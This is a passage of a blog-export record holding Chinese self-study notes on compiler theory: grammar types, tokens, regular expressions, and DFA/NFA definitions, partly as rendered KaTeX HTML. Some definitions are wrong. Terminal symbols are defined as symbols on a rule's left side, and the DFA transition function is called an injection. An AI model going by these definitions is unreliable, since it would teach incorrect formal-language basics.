2型文法（上下文无关文法）\n若文法中每一条规则的形式为$A \\rightarrow \\beta$，且满足：\n1. $A \\in V_{N}$。\n2. $\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$。\n\n编译原理课程所主要研究对象为上下文无关文法。\n\n#### 3型文法（正规文法）\n- 若每条规则的形式为$A\\rightarrow \\alpha B$或者$A \\rightarrow \\alpha$，其中$A,B \\in V_{N}, \\alpha \\in V_{T}^{*}$，则称其为**右线性文法**。\n- 若每条规则的形式为$A\\rightarrow B \\alpha$或者$A \\rightarrow \\alpha$，其中$A,B \\in V_{N}, \\alpha \\in V_{T}^{*}$，则称其为**左线性文法**。\n\n左、右线性文法都被称为3型文法、正规文法，其语言为正规语言。\n\n从0型文法到3型文法，对规则的限制逐渐增加，每一种文法都是前一种文法的**子文法**。\n\n## 词法分析和有穷自动机\n\n### 词法分析程序\n词法分析程序是语法分析程序的一个子程序（子类），每当语法分析程序需要一个单词符号时，就调用词法分析程序的API，让词法分析程序从输入的String中，识别出一个具有独立意义的token。\n\n### Token\n\n#### token简介\n词法分析程序的输入是String形式的**source program**，输出tokens。这样的过程叫做tokenization。\n\ntoken是语言中具有独立意义的最小语法单位。一般分为5种：\n\n1. keyword\t比如：if, else, while, do等\n2. identifier\t比如：对象名、函数名等\n3. constant\t包括stringConstant、intConstant、floatConstant和boolConstant\n4. operator\t包括加减乘除等\n5. punctuator\t包括分号，逗号，括号等\n\n####  输出token的形式\n以以下形式输出token：\n$$\n\\left(tokenType,\\ tokenValue\\right)\n$$\n1. 每一个tokenType对应一个整数编码。\n2. 当一个tokenType里只含有一种value时，该整数编码就完全代表了value，因此value可以省略。\n\n#### token的两种定义\n\n##### 正规文法（左线型文法或者右线性文法）\n正规文法定义token易于识别，以identifier举例：\n$$\n<identifier> \\rightarrow l|<identifier>l|<identifier>d \\\\\nl:\\ a\\sim z \\  or\\  A \\sim Z\\\\\nd:\\ 0\\sim 9\n$$\n\n##### 正规式 regular expression\n设存在字母表$\\Sigma = \\left \\{a_{1}, a_{2},...,a_{n}\\right\\}$，在其上的正规式与正规式表示的正规集用以下（递归）规则定义：\n\n1. $\\varnothing$是$\\Sigma$上的正规式，表示的正规集也是$\\varnothing$。\n2. $\\epsilon$是$\\Sigma$上的正规式，表示的正规集是$\\left\\{\\epsilon\\right\\}$。\n3. $a_{i}$是$\\Sigma$上的正规式，表示的正规集是$\\left\\{a_{i}\\right\\}$。\n4. 若$e_{1}$和$e_{2}$都是$\\Sigma$上的正规式，所表示的正规集为$L\\left(e_{1}\\right)$和$L\\left(e_{2}\\right)$，那么\n\t1. $e_{1}|e_{2}$也是正规式，$L\\left(e_{1}|e_{2}\\right)=L\\left(e_{1}\\right) \\cup L\\left(e_{2}\\right)$。\n\t2. $e_{1}e_{2}$也是正规式，$L\\left(e_{1}e_{2}\\right)=L\\left(e_{1}\\right)  L\\left(e_{2}\\right)$。\n\t3. $\\left(e_{1}\\right)^{*}$也是正规式，$L\\left(\\left(e_{1}\\right)^{*}\\right)=\\left(L\\left(e_{1}\\right)\\right)^{*}$。\n\n##### 正规式的一些性质\n1. $|$运算的交换律\t$A|B=B|A$\n2. $|$运算的结合律\t$A|\\left(B|C\\right)=\\left(A|B\\right)|C$\n3. $\\cdot$运算的结合律\t$A\\left(BC\\right)=\\left(AB\\right)C$\n4. 分配律\t$A\\left(B|C\\right)=AB|AC$\n5. $A\\epsilon|\\epsilon A=A$\n6. $\\left(A^{*}\\right)^{*}=A^{*}$\n\n#### 正规文法与正规式的相互转换\n\n##### 正规文法转正规式\n1. 将正规文法中的每个nonterminal表示成关于它的正规式方程，获得一个**联立方程组**。\n2. 终结规则：\n$$\nif\\ \\  x=\\alpha x|\\beta,\\ x=\\alpha^{*}\\beta \\\\\nif\\ \\  x=x\\alpha|\\beta,\\ x=\\beta\\alpha^{*}\n$$\n3. 用终结规则、分配律、交换律和结合律求解即可。\n\n一个（不太）简单的例子\n$$\n正规文法\\ G：\\\\\nZ\\rightarrow 0A\\\\\nA\\rightarrow 0A|0B \\\\\nB\\rightarrow 1A|\\epsilon\n$$\n由第三式和第二式，有\n$$\nA=0A|01A|0 \\\\\nA=(0|01)A|0\n$$\n所以\n$$\nA=(0|01)^{*}0 \\\\\nZ=0(0|01)^{*}0\n$$\n\n##### 正规式转换正规文法\n假设存在字母表$\\Sigma$和正规式，需要转换为正规文法$G=\\left(V_{N},V_{T},P,S\\right)$。\n\n1. $V_{T}=\\Sigma$。\n2. 对原始正规式$R$选择一个nonterminal $Z$，生成规则$Z\\rightarrow R$，令$S=Z$。\n3. 若存在形如$A\\rightarrow ab$的规则，转换为$A\\rightarrow \\alpha B$和$B\\rightarrow b$。\n4. 若存在形如$A\\rightarrow a^{*}b$的规则，转换为$A \\rightarrow aA|b$。\n5. 重复3和4，直到没得转换。\n\n### 有穷自动机\n有穷自动机是具有**离散输入**和**输出系统**的一种抽象数学模型，分为确定有穷自动机和非确定有穷自动机，两者都能准确识别正规集。\n\n#### 确定有穷自动机 DFA\n一个DFA是一个五元组$M=\\left(Q,\\Sigma,f,S,Z\\right)$，其中\n1. $Q$是一个有穷状态集合，集合中每一个元素是一个**状态**；\n2. $\\Sigma$是一个有穷输入字母表，表中每个元素称为一个**输入字符**；\n3. $f$是一个$Q \\times \\Sigma$到$Q$的单射，即$\\left(q_{i},a\\right)\\stackrel{f}{\\rightarrow} q_{j}，其中q_{i},q_{j} \\in Q,a \\in \\Sigma$；\n4. $S \\in Q$是唯一的一个初态；\n5. $Z \\subseteq Q$是终态集合。\n\n当前状态为$q_{i}$、输入字符为$a$时，自动机就转换到下一个状态$q_{j}$。此时$q_{j}$称为$q_{i}$的一个后继状态。\n\n单射的意义：任意一个状态与输入的二元组都**唯一**确定了下一个状态。\n\n一个DFA可以用一个矩阵表示，也可以用图表示。\n\n- 用矩阵表示时，行表示状态，列表示输入符号，矩阵元素表示$f\\left(q,a\\right)$\n- 用图表示时，假设有m个状态和n个输入字符，则图含有m个状态结，每个状态结**最多**有n条**箭弧**与别的状态结连接。整个图含有**唯一**一个初态结和多个终态结。\n- 对于$\\Sigma^{*}$中的任意符号串$\\beta$，若存在一条路从初态结到终态结，且这条路上所有的符号连成的符号串等于$\\beta$，则称：**$\\beta$被DFA $M$所识别**。\n- 若$M$的初态结也是终态结，那么$\\epsilon$也可以被识别。\n- DFA $M$可识别的符号串的全体记为$L\\left(M\\right)$。\n\n#### 非确定有穷自动机 NFA\n一个NFA也是一个五元组$M=\\left(Q,\\Sigma,f,S,Z\\right)$，其中\n1. $Q,\\Sigma,Z$与DFA中相同；\n2. $f$不再是单射，而是一个**多值**函数，映射出一个集合；\n3. $f\\left(q_{i},a\\right)=\\left\\{某些状态的集合\\right\\}$；\n4. $S \\subset Q$是**非空初态集**。\n\n- NFA允许状态图中，边的标记为$\\epsilon$。\n- ","slug":"编译原理知识点自整理","published":1,"updated":"2020-11-30T07:09:24.340Z","_id":"ckiszi5an000l98wacmr2fi9o","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"文法和语言\"><a class=\"markdownIt-Anchor\" href=\"#文法和语言\"></a> 文法和语言</h2>\n<h3 id=\"字母表和符号串\"><a class=\"markdownIt-Anchor\" href=\"#字母表和符号串\"></a> 字母表和符号串</h3>\n<ol>\n<li>字母表是非空元素的<strong>集合</strong>。用<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>表示</li>\n<li>字母表中的元素称为<strong>符号</strong>或者<strong>字符</strong>。</li>\n<li>符号所形成的有穷有序序列称为<strong>符号串</strong>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>记为空符号串。</li>\n</ol>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mo>=</mo><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">x=y\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span></span></p>\n<h3 id=\"符号串的形式运算\"><a class=\"markdownIt-Anchor\" href=\"#符号串的形式运算\"></a> 符号串的形式运算</h3>\n<ol>\n<li>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span>是符号串，则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">xy</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span>记为把<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span>写在<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>后面形成的符号串。</li>\n<li><strong>符号串的集合</strong>的乘积定义为集合的笛卡儿积。</li>\n<li>符号串整数幂运算定义为多次乘积。特别地，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mi>x</mi><mn>0</mn></msup><mo>=</mo><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">x^{0}=\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>。</li>\n<li>符号串集合的幂运算定义为多次笛卡儿积。特别地，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mi>A</mi><mn>0</mn></msup><mo>=</mo><mrow><mo fence=\"true\">{</mo><mi>ϵ</mi><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">A^{0}=\\left\\{\\epsilon\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>。</li>\n<li>符号串集合<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>的闭包定义为</li>\n</ol>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mi>A</mi><mo>+</mo></msup><mo>=</mo><msup><mi>A</mi><mn>1</mn></msup><mo>∪</mo><msup><mi>A</mi><mn>2</mn></msup><mo>∪</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mspace linebreak=\"newline\"></mspace><msup><mi>A</mi><mo>∗</mo></msup><mo>=</mo><msup><mi>A</mi><mn>0</mn></msup><mo>∪</mo><msup><mi>A</mi><mn>1</mn></msup><mo>∪</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A^{+}=A^{1}\\cup A^{2} \\cup ...\\\\\nA^{*}=A^{0}\\cup A^{1} \\cup ...\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.821331em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.821331em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.10556em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.738696em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.10556em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span></span></p>\n<h3 id=\"形式语言\"><a class=\"markdownIt-Anchor\" href=\"#形式语言\"></a> 形式语言</h3>\n<ol>\n<li>符号串的集合是形式语言。</li>\n<li>形式语言不考虑语义。</li>\n<li>当语言是有穷集合时，用枚举方法表示。</li>\n<li>当语言是无穷集合时，用<strong>文法</strong>表示语言。</li>\n</ol>\n<h3 id=\"文法\"><a class=\"markdownIt-Anchor\" href=\"#文法\"></a> 文法</h3>\n<h4 id=\"文法的规则\"><a class=\"markdownIt-Anchor\" href=\"#文法的规则\"></a> 文法的规则</h4>\n<ol>\n<li>产生式（规则）是一个符号与一个符号串形成的有序对。写作<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>。意为左部符号用右部的符号串定义。</li>\n<li>一组规则规定了一个语言的语法结构。</li>\n<li>符号分两类：terminal符号和nonterminal符号。terminal符号定义为出现在规则左部、能派生出符号或者符号串的符号。</li>\n</ol>\n<h4 id=\"文法-2\"><a class=\"markdownIt-Anchor\" href=\"#文法-2\"></a> 文法</h4>\n<p>文法是规则的非空有穷集合，表示为四元组<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator=\"true\">,</mo><mi>P</mi><mo separator=\"true\">,</mo><mi>S</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G=\\left(V_{N},V_{T},P,S\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。<br />\n其中<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding=\"application/x-tex\">V_{N}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>是nonterminal符号，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>V</mi><mi>T</mi></msub></mrow><annotation encoding=\"application/x-tex\">V_{T}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>是terminal符号，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>P</mi></mrow><annotation encoding=\"application/x-tex\">P</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span></span></span></span>是规则集合，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>是文法的开始符号。</p>\n<h3 id=\"语言\"><a class=\"markdownIt-Anchor\" href=\"#语言\"></a> 语言</h3>\n<h4 id=\"推导\"><a class=\"markdownIt-Anchor\" href=\"#推导\"></a> 推导</h4>\n<h5 id=\"直接推导\"><a class=\"markdownIt-Anchor\" href=\"#直接推导\"></a> 直接推导</h5>\n<p>令<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是一个文法。</p>\n<p>仅当<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的一个规则且<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">x,y \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7335400000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" 